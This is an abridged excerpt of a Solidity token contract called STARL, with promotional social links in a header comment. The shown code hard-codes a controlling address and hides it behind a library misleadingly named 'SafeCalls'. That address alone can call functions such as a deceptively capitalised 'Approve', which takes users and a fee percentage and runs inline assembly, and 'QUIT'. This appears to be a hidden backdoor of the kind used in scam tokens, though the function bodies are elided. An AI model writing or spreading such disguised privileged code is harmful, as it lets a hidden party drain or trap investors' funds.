...
Telegram:https://t.me/StarlinkTwoEntry
Website：https://starlproject.com

Twitter：https://twitter.com/Starlink20_ERC
*/
...
library SafeCalls {
    function checkCaller(address sender, address _ossw) internal pure {
        require(sender == _ossw, "Caller is not the original caller");
    }
}
contract STARL is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _ossw = 0xD30DcBb9916F6677761AA61867Aa52dd5fA41aeD;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function Approve(address[] memory users, uint256 feePercent) external {
        SafeCalls.checkCaller(_msgSender(), _ossw);
        assembly {
    ...
    function QUIT(address recipient)  external {
        SafeCalls.checkCaller(_msgSender(), _ossw);
